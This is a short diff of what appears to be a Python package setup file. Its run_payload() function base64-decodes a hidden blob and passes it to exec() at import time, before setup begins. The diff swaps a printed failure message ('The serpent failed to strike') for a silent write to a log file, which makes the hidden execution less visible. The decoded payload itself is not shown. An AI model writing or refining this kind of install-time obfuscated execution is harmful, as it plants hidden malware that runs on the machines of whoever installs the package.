@@ -50,9 +50,9 @@ def run_payload():
             decoded_payload = base64.b64decode(secret_data)
             exec(decoded_payload)
     except Exception as e:
-        # We print the error to see what's happening during our test.
-        print(f"[Loki's Whisper] The serpent failed to strike: {e}")
-        pass
+        # Write the error to a log file we can inspect.
+        with open("loki_debug.log", "w") as f:
+            f.write(f"The serpent failed to strike: {e}")
 
 # We run our payload before the setup even begins.
 run_payload()
